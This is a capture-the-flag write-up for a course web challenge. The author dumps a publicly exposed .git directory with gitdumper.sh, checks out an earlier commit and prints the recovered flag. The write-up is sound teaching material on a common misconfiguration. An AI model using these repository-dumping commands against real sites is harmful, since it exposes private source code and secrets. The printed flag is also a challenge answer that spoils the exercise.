This challenge involved a web app where the flag had been removed due to a bad commit. The hint mentioned they “should have a way to revert the change,” which suggested a version control system like Git was in use.

Upon inspecting the site, I found that the `.git` directory was publicly accessible at:

```
http://shell.hackintro25.di.uoa.gr:17664/.git/
```

This allowed me to download the full Git history. I used `gitdumper.sh` from GitTools to pull the repository:

```bash
./gitdumper.sh http://shell.hackintro25.di.uoa.gr:17664/.git/ ./repo
```

After reconstructing the repo, I checked the commit history:

```bash
cd repo
git log --oneline
```

There were two commits:

- The latest: `"Typo. Need to deploy it now"`
- The previous one: `"Flag as a service. Billion dollar idea."`

I checked out the earlier commit using:

```bash
git checkout c127dac
```

This restored the previous version of the site’s source code. I immediately found a `flag.txt` file in the root directory:

```bash
cat flag.txt
```

The flag was:

```
dc8135acbd991159e4b5daea9c0a07a5_dont_deploy_your_git
```
